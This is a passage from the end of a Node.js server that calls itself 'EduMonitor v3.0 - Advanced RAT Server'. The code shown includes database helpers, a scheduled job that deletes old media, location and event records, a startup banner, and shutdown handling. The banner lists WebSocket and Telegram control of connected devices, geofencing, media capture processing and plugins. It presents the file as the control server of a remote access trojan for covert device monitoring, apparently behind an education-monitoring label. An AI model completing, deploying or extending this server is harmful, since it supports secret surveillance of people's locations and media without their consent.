                MAX(battery_level) as max_battery
                FROM devices 
                WHERE id = ?`,
            [deviceId],
            (err, rows) => {
                if (err) reject(err);
                else resolve(rows[0]);
            }
        );
    });
}

async function getEventStats(deviceId, from, to) {
    return new Promise((resolve, reject) => {
        db.all(`SELECT severity, COUNT(*) as count
                FROM events 
                WHERE device_id = ? AND timestamp BETWEEN ? AND ?
                GROUP BY severity`,
            [deviceId, from, to],
            (err, rows) => {
                if (err) reject(err);
                else resolve(rows);
            }
        );
    });
}

async function getMediaById(mediaId) {
    return new Promise((resolve, reject) => {
        db.get('SELECT * FROM media WHERE id = ?', [mediaId], (err, row) => {
            if (err) reject(err);
            else resolve(row);
        });
    });
}

// ============================================
// CLEANUP JOBS
// ============================================
// Clean old files daily
schedule.scheduleJob('0 0 * * *', () => {
    const cutoff = Date.now() - config.storage.retentionDays * 24 * 60 * 60 * 1000;
    
    db.all('SELECT file_path, thumbnail_path FROM media WHERE timestamp < ?', [cutoff], (err, media) => {
        media.forEach(item => {
            try {
                if (item.file_path && fs.existsSync(item.file_path)) {
                    fs.unlinkSync(item.file_path);
                }
                if (item.thumbnail_path && fs.existsSync(item.thumbnail_path)) {
                    fs.unlinkSync(item.thumbnail_path);
                }
            } catch (error) {
                console.error('Cleanup error:', error);
            }
        });
    });

    db.run('DELETE FROM media WHERE timestamp < ?', [cutoff]);
    db.run('DELETE FROM locations WHERE timestamp < ?', [cutoff]);
    db.run('DELETE FROM events WHERE timestamp < ?', [cutoff]);
});

// ============================================
// START SERVER
// ============================================
server.listen(config.server.port, config.server.host, () => {
    console.log('\n🚀 ===============================================');
    console.log(`🚀 EduMonitor v3.0 - Advanced RAT Server`);
    console.log(`🚀 ===============================================`);
    console.log(`\n📡 HTTP Server: http://${config.server.host}:${config.server.port}`);
    console.log(`🔌 WebSocket: ws://${config.server.host}:${config.server.port}/ws`);
    console.log(`🤖 Telegram Bot: @${config.telegram.token.split(':')[0]}`);
    console.log(`📊 Database: SQLite3 (edumonitor.db)`);
    console.log(`🔐 Encryption: AES-256-GCM`);
    console.log(`\n✅ Features Enabled:`);
    console.log(`   └─ WebSocket + HTTP Fallback`);
    console.log(`   └─ Geofencing & Alerts`);
    console.log(`   └─ Media Processing (Sharp + FFmpeg)`);
    console.log(`   └─ Plugin System`);
    console.log(`   └─ Real-time Analytics`);
    console.log(`   └─ End-to-End Encryption`);
    console.log(`   └─ Rate Limiting & Security`);
    console.log(`   └─ Automatic Cleanup`);
    console.log(`\n🚀 ===============================================\n`);
});

// Graceful shutdown
process.on('SIGTERM', shutdown);
process.on('SIGINT', shutdown);

async function shutdown() {
    console.log('\n🛑 Shutting down gracefully...');

    // Notify all devices
    deviceManager.broadcastToDevices({
        type: 'shutdown',
        timestamp: Date.now()
    });

    // Close all connections
    wss.close();
    server.close(() => {
        db.close();
        process.exit(0);
    });
}

module.exports = { app, server, wss, deviceManager, db };
